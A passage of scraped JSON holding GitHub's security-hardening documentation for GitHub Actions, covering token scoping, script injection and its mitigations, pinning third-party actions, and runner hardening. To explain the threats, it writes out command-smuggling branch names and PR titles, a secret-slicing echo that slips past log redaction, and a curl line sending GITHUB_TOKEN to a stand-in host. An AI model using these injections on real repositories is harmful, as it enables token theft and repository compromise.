          "Use credentials that are minimally scopedMake sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository.Actions can use theGITHUB_TOKENby accessing it from thegithub.tokencontext. For more information, seeAccessing contextual information about workflow runs. You should therefore make sure that theGITHUB_TOKENis granted the minimum required permissions. It's good security practice to set the default permission for theGITHUB_TOKENto read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, seeAutomatic token authentication.",
          "Make sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository.",
          "Actions can use theGITHUB_TOKENby accessing it from thegithub.tokencontext. For more information, seeAccessing contextual information about workflow runs. You should therefore make sure that theGITHUB_TOKENis granted the minimum required permissions. It's good security practice to set the default permission for theGITHUB_TOKENto read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, seeAutomatic token authentication.",
          "Audit and rotate registered secretsPeriodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.",
          "Periodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.",
          "Rotate secrets periodically to reduce the window of time during which a compromised secret is valid.",
          "Consider requiring review for access to secretsYou can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, seeUsing secrets in GitHub ActionsandManaging environments for deployment.",
          "You can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, seeUsing secrets in GitHub ActionsandManaging environments for deployment."
        ]
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Any user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "UsingCODEOWNERSto monitor changes"
      },
      {
        "type": "paragraph",
        "text": "You can use theCODEOWNERSfeature to control how changes are made to your workflow files. For example, if all your workflow files are stored in.github/workflows, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout code owners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Understanding the risk of script injections"
      },
      {
        "type": "paragraph",
        "text": "When creating workflows,custom actions, andcomposite actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner."
      },
      {
        "type": "paragraph",
        "text": "Attackers can add their own malicious content to thegithubcontext, which should be treated as potentially untrusted input. These contexts typically end withbody,default_branch,email,head_ref,label,message,name,page_name,ref, andtitle. For example:github.event.issue.title, orgithub.event.pull_request.body."
      },
      {
        "type": "paragraph",
        "text": "You should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of GitHub Actions. For information on some of the steps an attacker could take, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "In addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example,zzz\";echo${IFS}\"hello\";#would be a valid branch name and would be a possible attack vector for a target repository."
      },
      {
        "type": "paragraph",
        "text": "The following sections explain how you can help mitigate the risk of script injection."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example of a script injection attack"
      },
      {
        "type": "paragraph",
        "text": "A script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Check PR title\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ $title =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi"
      },
      {
        "type": "paragraph",
        "text": "This example is vulnerable to script injection because theruncommand executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside${{ }}are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection."
      },
      {
        "type": "paragraph",
        "text": "To inject commands into this workflow, the attacker could create a pull request with a title ofa\"; ls $GITHUB_WORKSPACE\":"
      },
      {
        "type": "paragraph",
        "text": "In this example, the\"character is used to interrupt thetitle=\"${{ github.event.pull_request.title }}\"statement, allowing thelscommand to be executed on the runner. You can see the output of thelscommand in the log:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Run title=\"a\"; ls $GITHUB_WORKSPACE\"\"\nREADME.md\ncode.yml\nexample.js"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Good practices for mitigating script injection attacks"
      },
      {
        "type": "paragraph",
        "text": "There are a number of different approaches available to help you mitigate the risk of script injection:"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using an action instead of an inline script (recommended)"
      },
      {
        "type": "paragraph",
        "text": "The recommended approach is to create a JavaScript action that processes the context value as an argument. This approach is not vulnerable to the injection attack, since the context value is not used to generate a shell script, but is instead passed to the action as an argument:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "uses: fakeaction/checktitle@v3\nwith:\n    title: ${{ github.event.pull_request.title }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using an intermediate environment variable"
      },
      {
        "type": "paragraph",
        "text": "For inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable."
      },
      {
        "type": "paragraph",
        "text": "The following example uses Bash to process thegithub.event.pull_request.titlevalue as an environment variable:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Check PR title\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: |\n          if [[ \"$TITLE\" =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi"
      },
      {
        "type": "paragraph",
        "text": "In this example, the attempted script injection is unsuccessful, which is reflected by the following lines in the log:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "env:\n     TITLE: a\"; ls $GITHUB_WORKSPACE\"\nPR title did not start with 'octocat'"
      },
      {
        "type": "paragraph",
        "text": "With this approach, the value of the${{ github.event.pull_request.title }}expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoidword splitting, but this isone of manygeneral recommendations for writing shell scripts, and is not specific to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using workflow templates for code scanning"
      },
      {
        "type": "paragraph",
        "text": "Code scanning allows you to find security vulnerabilities before they reach production. GitHub provides workflow templates for code scanning. You can use these suggested workflows to construct your code scanning workflows, instead of starting from scratch. GitHub's workflow, the CodeQL analysis workflow, is powered by CodeQL. There are also third-party workflow templates available."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout code scanningandConfiguring advanced setup for code scanning."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Restricting permissions for tokens"
      },
      {
        "type": "paragraph",
        "text": "To help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, seeAutomatic token authentication."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using OpenID Connect to access cloud resources"
      },
      {
        "type": "paragraph",
        "text": "If your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Support for custom claims for OIDC is unavailable in AWS."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using third-party actions"
      },
      {
        "type": "paragraph",
        "text": "The individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them."
      },
      {
        "type": "paragraph",
        "text": "This means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use theGITHUB_TOKENto write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on GitHub. For information on some of the steps an attacker could take, seeSecurity hardening for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "You can help mitigate this risk by following these good practices:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Pin actions to a full length commit SHAPinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.",
          "Audit the source code of the actionEnsure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.",
          "Pin actions to a tag only if you trust the creatorAlthough pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on GitHub Marketplace is a useful signal, as it indicates that the action was written by a team whose identity has been verified by GitHub. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reusing third-party workflows"
      },
      {
        "type": "paragraph",
        "text": "The same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using Dependabot version updates to keep actions up to date"
      },
      {
        "type": "paragraph",
        "text": "You can use Dependabot to ensure that references to actions and reusable workflows used in your repository are kept up to date. Actions are often updated with bug fixes and new features to make automated processes faster, safer, and more reliable. Dependabot takes the effort out of maintaining your dependencies as it does this automatically for you. For more information, seeKeeping your actions up to date with DependabotandAbout Dependabot security updates."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Preventing GitHub Actions from creating or approving pull requests"
      },
      {
        "type": "paragraph",
        "text": "You can choose to allow or prevent GitHub Actions workflows from creating or approving pull requests. Allowing workflows, or any other automation, to create or approve pull requests could be a security risk if the pull request is merged without proper oversight."
      },
      {
        "type": "paragraph",
        "text": "For more information on how to configure this setting, seeDisabling or limiting GitHub Actions for your organization, andManaging GitHub Actions settings for a repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using code scanning to secure workflows"
      },
      {
        "type": "paragraph",
        "text": "Code scanning can automatically detect and suggest improvements for common vulnerable patterns used in GitHub Actions workflows.\nFor more information on how to enable code scanning, seeConfiguring default setup for code scanning."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using OpenSSF Scorecards to secure workflow dependencies"
      },
      {
        "type": "paragraph",
        "text": "Scorecardsis an automated security tool that flags risky supply chain practices. You can use theScorecards actionandworkflow templateto follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Potential impact of a compromised runner"
      },
      {
        "type": "paragraph",
        "text": "These sections consider some of the steps an attacker can take if they're able to run malicious commands on a GitHub Actions runner."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Accessing secrets"
      },
      {
        "type": "paragraph",
        "text": "Workflows triggered from a forked repository using thepull_requestevent have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such asissue_comment,issues,pushandpull_requestfrom a branch within the repository, where the attacker could attempt to steal repository secrets or use the write permission of the job'sGITHUB_TOKEN."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If the secret or token is set to an environment variable, it can be directly accessed through the environment usingprintenv.",
          "If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.",
          "For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:uses:fakeaction/publish@v3with:key:${{secrets.PUBLISH_KEY}}"
        ]
      },
      {
        "type": "paragraph",
        "text": "Although GitHub Actions scrubs secrets from memory that are not referenced in the workflow (or an included action), theGITHUB_TOKENand any referenced secrets can be harvested by a determined attacker."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Exfiltrating data from a runner"
      },
      {
        "type": "paragraph",
        "text": "An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, GitHub Actionsautomatically redact secrets printed to the log, but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated usingecho ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Stealing the job'sGITHUB_TOKEN"
      },
      {
        "type": "paragraph",
        "text": "It is possible for an attacker to steal a job'sGITHUB_TOKEN. The GitHub Actions runner automatically receives a generatedGITHUB_TOKENwith permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example:a\"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Modifying the contents of a repository"
      },
      {
        "type": "paragraph",
        "text": "The attacker server can use the GitHub API tomodify repository content, including releases, if the assigned permissions ofGITHUB_TOKENare not restricted."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Considering cross-repository access"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions is intentionally scoped for a single repository at a time. TheGITHUB_TOKENgrants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of theGITHUB_TOKENif necessary. Users have specific permissions for each repository, so allowing theGITHUB_TOKENfor one repository to grant access to another would impact the GitHub permission model if not implemented carefully. Similarly, caution must be taken when adding GitHub authentication tokens to a workflow, because this can also affect the GitHub permission model by inadvertently granting broad access to collaborators."
      },
      {
        "type": "paragraph",
        "text": "If your organization is owned by an enterprise account, then you can share and reuse GitHub Actions by storing them in internal repositories. For more information, seeSharing actions and workflows with your enterprise."
      },
      {
        "type": "paragraph",
        "text": "You can perform other privileged, cross-repository interactions by referencing a GitHub authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended."
      },
      {
        "type": "paragraph",
        "text": "This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "TheGITHUB_TOKENThis token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, seeAutomatic token authentication.TheGITHUB_TOKENshould be used whenever possible.",
          "This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, seeAutomatic token authentication.",
          "TheGITHUB_TOKENshould be used whenever possible.",
          "Repository deploy keyDeploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, seeManaging deploy keys.Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.",
          "Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, seeManaging deploy keys.",
          "Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.",
          "GitHub App tokensGitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, seeMaking authenticated API requests with a GitHub App in a GitHub Actions workflow.",
          "GitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, seeMaking authenticated API requests with a GitHub App in a GitHub Actions workflow.",
          "personal access tokensYou should never use a personal access token (classic). These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.If you do use a personal access token, you should never use a personal access token from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a fine-grained personal access token for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.",
          "You should never use a personal access token (classic). These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.",
          "If you do use a personal access token, you should never use a personal access token from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a fine-grained personal access token for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.",
          "SSH keys on a personal accountWorkflows should never use the SSH keys on a personal account. Similar to personal access tokens (classic), they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.",
          "Workflows should never use the SSH keys on a personal account. Similar to personal access tokens (classic), they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Hardening for GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners take measures to help you mitigate security risks."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Reviewing the supply chain for GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "For GitHub-hosted runners created from images maintained by GitHub, you can view a software bill of materials (SBOM) to see what software was pre-installed on the runner. You can provide your users with the SBOM which they can run through a vulnerability scanner to validate if there are any vulnerabilities in the product. If you are building artifacts, you can include this SBOM in your bill of materials for a comprehensive list of everything that went into creating your software."
      },
      {
        "type": "paragraph",
        "text": "SBOMs are available for Ubuntu, Windows, and macOS runner images maintained by GitHub. You can locate the SBOM for your build in the release assets athttps://github.com/actions/runner-images/releases. An SBOM with a filename in the format ofsbom.IMAGE-NAME.json.zipcan be found in the attachments of each release."
      },
      {
        "type": "paragraph",
        "text": "For third-party images, such as the images for ARM-powered runners, you can find details of the software that's included in the image in theactions/partner-runner-imagesrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Denying access to hosts"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners are provisioned with anetc/hostsfile that blocks network access to various cryptocurrency mining pools and malicious sites. Hosts such as MiningMadness.com and cpu-pool.com are rerouted to localhost so that they do not present a significant security risk. For more information, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Hardening for self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hostedrunners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process."
      },
      {
        "type": "paragraph",
        "text": "Self-hostedrunners for GitHub do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow."
      },
      {
        "type": "paragraph",
        "text": "As a result, self-hosted runners should almostnever be used for public repositorieson GitHub, because any user can open pull requests against the repository and compromise the environment. Similarly, be cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and theGITHUB_TOKENwhich, depending on its settings, can grant write access to the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner."
      },
      {
        "type": "paragraph",
        "text": "Organization owners can choose which repositories are allowed to create repository-level self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeDisabling or limiting GitHub Actions for your organization."
      },
      {
        "type": "paragraph",
        "text": "When a self-hosted runner is defined at the organization or enterprise level, GitHub can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. You can restrict what organizations and repositories can access runner groups. For more information, seeManaging access to self-hosted runners using groups."
      },
      {
        "type": "paragraph",
        "text": "You should also consider the environment of the self-hosted runner machines:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "What sensitive information resides on the machine configured as a self-hosted runner? For example, private SSH keys, API access tokens, among others.",
          "Does the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment."
        ]
      },
      {
        "type": "paragraph",
        "text": "Some customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such asps x -w. This can lead to secret leakages."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using just-in-time runners"
      },
      {
        "type": "paragraph",
        "text": "To improve runner registration security, you can use the REST API to create ephemeral, just-in-time (JIT) runners. These self-hosted runners perform at most one job before being automatically removed from the repository, organization, or enterprise. For more information about configuring JIT runners, seeREST API endpoints for self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Re-using hardware to host JIT runners can risk exposing information from the environment. Use automation to ensure the JIT runner uses a clean environment. For more information, seeAutoscaling with self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "Once you have the config file from the REST API response, you can pass it to the runner at startup."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "./run.sh --jitconfig ${encoded_jit_config}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Planning your management strategy for self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "A self-hosted runner can be added to various levels in your GitHub hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:"
      },
      {
        "type": "paragraph",
        "text": "Centralized management:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.",
          "If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future."
        ]
      },
      {
        "type": "paragraph",
        "text": "Decentralized management:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.",
          "You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Authenticating to your cloud provider"
      },
      {
        "type": "paragraph",
        "text": "If you are using GitHub Actions to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Auditing GitHub Actions events"
      },
      {
        "type": "paragraph",
        "text": "You can use the security log to monitor activity for your user account and the audit log to monitor activity in your organization. The security and audit log records the type of action, when it was run, and which personal account performed the action."
      },
      {
        "type": "paragraph",
        "text": "For example, you can use the audit log to track theorg.update_actions_secretevent, which tracks changes to organization secrets."
      },
      {
        "type": "paragraph",
        "text": "For the full list of events that you can find in the audit log for each account type, see the following articles:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Security log events",
          "Audit log events for your organization"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-githubs-security-features-to-secure-your-use-of-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About GitHub's security features"
      },
      {
        "type": "paragraph",
        "text": "GitHub provides many features to make your code more secure. You can use GitHub's built-in features to understand the actions your workflows depend on, ensure you are notified about vulnerabilities in the actions you consume, or automate the process of keeping the actions in your workflows up to date. If you publish and maintain actions, you can use GitHub to communicate with your community about vulnerabilities and how to fix them. For more information about security features that GitHub offers, seeGitHub security features."
      },
      {
        "type": "paragraph",
        "text": "This article will explain how you can use some of GitHub's security features to increase the security of your use of GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Understanding dependencies in your workflows"
      },
      {
        "type": "paragraph",
        "text": "You can use the dependency graph to explore the actions that the workflows in your repository use. The dependency graph is a summary of the manifest and lock files stored in a repository. It also recognizes files in./github/workflows/as manifests, which means that any actions or workflows referenced using the syntaxjobs[*].steps[*].usesorjobs.<job_id>.useswill be parsed as dependencies."
      },
      {
        "type": "paragraph",
        "text": "The dependency graph shows the following information about actions used in workflows:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The account or organization that owns the action.",
          "The workflow file that references the action.",
          "The version or SHA the action is pinned to."
        ]
      },
      {
        "type": "paragraph",
        "text": "In the dependency graph, dependencies are automatically sorted by vulnerability severity. If any of the actions you use have security advisories, they will display at the top of the list. You can navigate to the advisory from the dependency graph and access instructions for resolving the vulnerability."
      },
      {
        "type": "paragraph",
        "text": "The dependency graph is enabled for public repositories, and you can choose to enable it on private repositories. For more information about using the dependency graph, seeExploring the dependencies of a repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Being aware of security vulnerabilities in actions you use"
      },
      {
        "type": "paragraph",
        "text": "For actions available on the marketplace, GitHub reviews related security advisories and then adds those advisories to the GitHub Advisory Database. You can search the database for actions that you use to find information about existing vulnerabilities and instructions for how to fix them. To streamline your search, use the GitHub Actions filter in theGitHub Advisory Database."
      },
      {
        "type": "paragraph",
        "text": "You can set up your repositories so that you:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Receive alerts when actions used in your workflows receive a vulnerability report. For more information, seeMonitoring the actions in your workflows.",
          "Are warned about existing advisories when you add or update an action in a workflow. For more information, seeScreening actions for vulnerabilities in new or updated workflows."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Monitoring the actions in your workflows"
      },
      {
        "type": "paragraph",
        "text": "You can use Dependabot to monitor the actions in your workflows and enable Dependabot alerts to notify you when an action you use has a reported vulnerability. Dependabot performs a scan of the default branch of the repositories where it is enabled to detect insecure dependencies. Dependabot generates Dependabot alerts when a new advisory is added to the GitHub Advisory Database or when an action you use is updated."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Dependabot only creates alerts for vulnerable actions that use semantic versioning and will not create alerts for actions pinned to SHA values."
      },
      {
        "type": "paragraph",
        "text": "You can enable Dependabot alerts for your personal account, for a repository, or for an organization. For more information, seeConfiguring Dependabot alerts."
      },
      {
        "type": "paragraph",
        "text": "You can view all open and closed Dependabot alerts and corresponding Dependabot security updates in your repository's Dependabot alerts tab. For more information, seeViewing and updating Dependabot alerts."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Screening actions for vulnerabilities in new or updated workflows"
      },
      {
        "type": "paragraph",
        "text": "When you open pull requests to update your workflows, it is good practice to use dependency review to understand the security impact of changes you've made to the actions you use. Dependency review helps you understand dependency changes and the security impact of these changes at every pull request. It provides an easily understandable visualization of dependency changes with a rich diff on the \"Files Changed\" tab of a pull request. Dependency review informs you of:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Which dependencies were added, removed, or updated, along with the release dates",
          "How many projects use these components",
          "Vulnerability data for these dependencies"
        ]
      },
      {
        "type": "paragraph",
        "text": "If any of the changes you made to your workflows are flagged as vulnerable, you can avoid adding them to your project or update them to a secure version."
      },
      {
        "type": "paragraph",
        "text": "For more information about dependency review, seeAbout dependency review."
      },
      {
        "type": "paragraph",
        "text": "The \"dependency review action\" refers to the specific action that can report on differences in a pull request within the GitHub Actions context. Seedependency-review-action. You can use the dependency review action in your repository to enforce dependency reviews on your pull requests. The action scans for vulnerable versions of dependencies introduced by package version changes in pull requests, and warns you about the associated security vulnerabilities. This gives you better visibility of what's changing in a pull request, and helps prevent vulnerabilities being added to your repository. For more information, seeAbout dependency review."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Keeping the actions in your workflows secure and up to date"
      },
      {
        "type": "paragraph",
        "text": "You can use Dependabot to ensure that references to actions and reusable workflows used in your repository are kept up to date. Actions are often updated with bug fixes and new features to make automated processes faster, safer, and more reliable. Dependabot takes the effort out of maintaining your dependencies as it does this automatically for you. For more information, seeKeeping your actions up to date with DependabotandAbout Dependabot security updates."
      },
      {
        "type": "paragraph",
        "text": "The following features can automatically update the actions in your workflows."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Dependabot version updatesopen pull requests to update actions to the latest version when a new version is released.",
          "Dependabot security updatesopen pull requests to update actions with reported vulnerabilities to the minimum patched version."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Dependabot only supports updates to GitHub Actions using the GitHub repository syntax, such asactions/checkout@v4. Dependabot will ignore actions or reusable workflows referenced locally (for example,./.github/actions/foo.yml).",
          "Docker Hub and GitHub Packages Container registry URLs are currently not supported. For example, references to Docker container actions usingdocker://syntax aren't supported.",
          "Dependabot supports both public and private repositories for GitHub Actions. For private registry configuration options, see \"git\" inDependabot options reference."
        ]
      },
      {
        "type": "paragraph",
